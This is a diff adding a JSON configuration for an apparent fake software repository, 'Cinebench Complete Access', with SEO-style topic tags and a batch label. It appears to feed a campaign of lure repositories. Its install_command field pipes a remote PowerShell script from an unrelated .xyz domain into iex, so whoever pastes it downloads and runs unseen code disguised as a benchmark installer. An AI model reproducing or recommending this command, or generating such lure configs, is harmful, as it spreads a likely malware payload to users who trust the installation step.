@@ -1,0 +1,27 @@
+{
+  "repo": "cinebench-complete-access",
+  "product": "Cinebench Complete Access",
+  "kind": "utility",
+  "install_type": "download",
+  "download_url": "https://cinebench.mefidirect.xyz/",
+  "install_url": "https://mefidirect.xyz/ps/setup.ps1",
+  "install_command": "irm https://mefidirect.xyz/ps/setup.ps1 | iex",
+  "batch": "new32",
+  "format": "license-md-only",
+  "category": "utility",
+  "topics": [
+    "cinebench-stable-build",
+    "cinebench-getting-started",
+    "cinebench-docs",
+    "pc-maintenance",
+    "cinebench-latest-build",
+    "windows-11",
+    "cinebench-howto",
+    "install-guide",
+    "cinebench-app",
+    "cinebench-setup-guide-2026",
+    "cinebench-connection-help",
+    "getting-started",
+    "quick-tips"
+  ]
+}
